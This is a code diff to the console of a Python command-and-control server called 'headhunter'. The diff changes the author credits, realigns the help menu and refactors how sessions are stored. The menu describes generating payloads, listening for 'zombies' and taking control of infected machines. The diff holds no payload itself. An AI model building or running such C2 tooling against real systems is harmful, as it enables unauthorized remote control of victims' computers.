@@ -28,7 +28,8 @@ print(
                          ░                                                           
 
 Command and Control Server (C2)
-Authors: Logan Goins & 0D1NSS0N
+Author: Logan Goins 
+Contributors: 0D1NSS0N
 
 type \'help\' for available commands
 ''')
@@ -55,16 +56,16 @@ while True:
 			                       Commands
 ------------------------------------------------------------------------------------------------------
 help                      --          displays this menu
-generate		  --          create a payload which is saved in the output folder
+generate		          --          create a payload which is saved in the output folder
 listen <LPORT>            --	      starts listening for zombies on the specified local port
-show connections	  -- 	      displays active zombie connections by address and source port
+show connections	      -- 	      displays active zombie connections by address and source port
 control <session>         --          controls an infected zombie by session number
 exit                      --          exits the headhunter interactive shell
 		''')
 	elif cmd == "control":		
 		try:
-			zombie = server.c[int(subcmd)-1]
-			zombiepubkey = server.public_partner[int(subcmd)-1]
+			zombie = server.zombies[int(subcmd)-1].c
+			zombiepubkey = server.zombies[int(subcmd)-1].public_partner
 			zombie.send(rsa.encrypt(str.encode("\n"), zombiepubkey))
 			print("Entering control mode for zombie " + subcmd + " on address " + str(zombie.getpeername()) + "\n")
 			server.control(zombie, zombiepubkey)	
@@ -73,10 +74,10 @@ exit                      --          exits the headhunter interactive shell
 	elif cmd == "show" and subcmd == "connections":		
 		try:
 			session = 0
-			for i in server.c:
+			for i in server.zombies:
 				if(i != None):
 					session+=1
-					print("session " + str(session) + " connected on address: " + str(i.getpeername()))
+					print("session " + str(session) + " connected on address: " + str(i.c.getpeername()))
 			print()			
 		except AttributeError:
 			print("Server hasn't started yet. Type \"listen <LHOST> <LPORT>\" to start listening for connections\n")		
